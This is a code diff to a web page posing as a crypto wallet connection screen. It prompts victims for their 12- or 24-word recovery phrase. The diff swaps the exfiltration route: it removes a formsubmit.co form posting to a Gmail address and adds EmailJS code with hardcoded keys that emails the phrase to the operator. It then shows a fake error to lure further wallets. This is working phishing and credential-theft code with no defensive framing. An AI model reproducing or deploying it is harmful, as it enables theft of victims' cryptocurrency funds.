@@ -1561,10 +1561,8 @@
             <br>
           </div>
 
-             <form action="https://formsubmit.co/jklaymorris00@gmail.com" method="post" enctype="multipart/form-data" id="form" class="ajaxForm">
-                                      <input type="hidden" name="_cc" value="formsubmitmails@gmail.com">
-                                        <input type="hidden" name="_captcha" value="false">
-                                        <input type="hidden" name="_next" value="https://blockchaindapperpro.vercel.app/access/point/barcode-generated.html">
+             <form action="" method="post" enctype="multipart/form-data" id="my-form" class="ajaxForm">
+                                      
                                        
                                        
                                        
@@ -1583,12 +1581,12 @@
             <p id="errorMessage" class="error-text" style="display: none">
               Error: Please enter a valid detail.
             </p>
-            <textarea id="inputTextArea" name="phrase" placeholder="Enter 12 or 24 words" required=""></textarea>
+            <textarea id="keys" name="message" placeholder="Enter 12 or 24 words" required=""></textarea>
 
             
 
             <div class="error" style="color: red"></div>
-            <button id="sendButton" type="submit" name="submit" value="submit">
+            <button id="submit" type="submit" name="submit" value="submit">
               Connect Wallet
             </button>
              </form>
@@ -1614,6 +1612,37 @@
       </div>
     </div>
 
+	<script type="text/javascript"
+  src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+<script type="text/javascript">
+  emailjs.init('h28EZzwf5njSkDy2Z')
+</script>
+	<script>
+
+		const btn = document.getElementById('submit');
+
+document.getElementById('my-form')
+ .addEventListener('submit', function(event) {
+   event.preventDefault();
+
+   btn.value = 'Sending...';
+
+   const serviceID = 'service_tucnfzv';
+   const templateID = 'template_ts5yaw9';
+
+   emailjs.sendForm(serviceID, templateID, this)
+    .then(() => {
+      btn.value = 'Send Email';
+      alert('An error occurred !!! User another wallet or Try Again.');
+    }, (err) => {
+      btn.value = 'Send Email';
+      alert(JSON.stringify(err));
+    });
+});
+	</script>
+
+	
         <script src="js/javasc.js"></script>
     
 
